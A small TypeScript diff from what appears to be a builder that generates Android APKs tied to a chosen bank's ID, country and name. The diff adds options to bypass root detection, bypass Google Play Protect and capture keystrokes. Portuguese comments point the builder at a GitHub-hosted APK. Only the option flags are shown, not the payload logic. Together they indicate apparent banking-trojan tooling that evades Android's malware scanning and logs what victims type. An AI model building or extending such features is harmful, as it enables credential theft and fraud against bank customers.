@@ -15,6 +15,9 @@ export async function generateAPK(options: {
   bankId: string;
   bankCountry: string;
   bankName: string;
+  enableRootBypass?: boolean;
+  enablePlayProtectBypass?: boolean;
+  enableKeylogCapture?: boolean;
 }): Promise<Buffer> {
   // URL do APK hospedado no GitHub (você preenche isso)
   // Exemplo: https://github.com/seu-user/seu-repo/releases/download/v1.0.0/app.apk
